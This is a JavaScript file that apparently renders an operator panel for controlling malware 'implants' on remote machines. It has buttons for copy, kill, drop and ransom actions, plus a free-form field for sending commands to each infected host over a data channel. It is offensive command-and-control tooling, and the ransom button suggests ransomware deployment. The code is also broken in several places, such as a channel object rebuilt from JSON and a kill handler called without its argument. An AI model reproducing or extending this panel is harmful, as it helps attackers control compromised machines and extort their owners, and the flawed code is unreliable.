
window.addEventListener('load', () => {

    const queryString = window.location.search;
    const urlParams = new URLSearchParams(queryString);
    const localid = urlParams.get('machineid');
    console.log(localid);

    var localdc = JSON.parse(localStorage[localid]);

    tableCreate(localid,localdc);
});

//Helper function to create table with implants
function tableCreate(implantId, dc) {
    const body = document.body;
    const tbl = document.createElement('table');

    for (let i = 0; i < 6; i++) {
    const tr = tbl.insertRow();
    tr.className = "tr-" + implantId;

    for (let j = 0; j < 2; j++) {
        
        // if (i === 2 && j === 1) {
        //   break;

        if(i == 0 && j == 0) {
        const td = tr.insertCell();
        td.appendChild(document.createTextNode(`ON`));
        td.style.backgroundColor = 'green';
        //td.appendChild(document.createTextNode(`   ${implantId}`));
        td.style.border = '2px solid black';

        }else if(i == 0 && j == 1) {
        const td = tr.insertCell();
        td.appendChild(document.createTextNode(`   ${implantId}`));

        //td.appendChild(document.createTextNode(`ONLINE`));
        td.style.border = '2px solid black';
        td.style.backgroundColor = 'Gainsboro';

        }else if(i == 1 && j == 0) {
        const td = tr.insertCell();
        var btn = document.createElement("BUTTON");
        btn.innerHTML = "C0PY";
        btn.style.color = 'gray';
        btn.style.backgroundColor = 'blue';
        function myfunction(dc){
            dc.send("copy");
        }
        btn.onclick = () => myfunction(dc);
        td.appendChild(btn);
        td.style.border = '2px solid black';
        td.style.backgroundColor = 'Gainsboro';


        }else if(i == 2 && j == 0) {
        const td = tr.insertCell();
        var btn = document.createElement("BUTTON");
        btn.innerHTML = "K1LL";
        btn.style.color = 'gray';
        btn.style.backgroundColor = 'red';
        function myfunction(dc){
            dc.send("kill");
        }
        
        //btn.onclick = () => myfunction(dc);
        btn.onclick = () => myfunction();
        td.appendChild(btn);
        td.style.border = '2px solid black';
        td.style.backgroundColor = 'Gainsboro';


        //td.appendChild(document.createTextNode(`+ Info`));
        

        } else if (i == 1 && j == 1) {
        var td = tr.insertCell();
        td.id = 'log-' + implantId;
        //td.appendChild(document.createTextNode(`This is an example of a pretty big log That maybe contain or not some breaks and it can definitely fill it up`));
        td.style.border = '2px solid black';
        td.style.backgroundColor = 'Gainsboro'
        if (i === 1 && j === 1) {
            td.setAttribute('rowSpan', '4');
        }
        } else if(i == 5 && j == 0){

        const td = tr.insertCell();
        var btn = document.createElement("BUTTON");
        btn.innerHTML = "SEND";
        btn.id = 'btn1'
        btn.style.color = 'gray';
        function myfunction(dc){
            dc.send(tbl.getElementsByClassName("input-" + implantId));
        }
            
        btn.onclick = () => myfunction(dc);
        btn.style.backgroundColor = 'springgreen';
        td.appendChild(btn); 
        td.style.border = '2px solid black';
        td.style.backgroundColor = 'Gainsboro';
        
        } else if (i == 5 && j == 1){
        const td = tr.insertCell();
        td.style.backgroundColor = 'springgreen';
        //td.appendChild(document.createTextNode(`Additional Information`));
        var input = document.createElement("input");
        input.placeholder = 'Type any command here'
        input.className = "input-" + implantId;
        td.appendChild(input);
        td.style.border = '2px solid black';
        td.colSpan = '2';
        

        }else if(i == 4 && j == 0){
        const td = tr.insertCell();
        var btn = document.createElement("BUTTON");
        btn.innerHTML = "RASM";
        btn.id = 'btnRansom'
        btn.style.color = 'gray';


        btn.style.backgroundColor = 'darkmagenta';
        td.appendChild(btn); 
        td.style.border = '2px solid black';
        td.style.backgroundColor = 'Gainsboro';

            //test
        


        }else if(i == 3 && j == 0){
        const td = tr.insertCell();
        var btn = document.createElement("BUTTON");
        btn.innerHTML = "DROP";
        btn.id = 'btnDrop'
        btn.style.color = 'gray';
        function myfunction(dc){
            dc.send(tbl.getElementsByClassName("input-" + implantId));
        }
            
        btn.onclick = () => myfunction(dc);
        btn.style.backgroundColor = 'cyan';
        td.appendChild(btn); 
        td.style.border = '2px solid black';
        td.style.backgroundColor = 'Gainsboro';


        }

    }
    }
    //tbl.className = "styled-table";
    tbl.style = 'a';
    tbl.classList.add('a');
    tbl.style.border = '2px solid black';
    body.prepend(tbl, document.body.firstElementChild);


}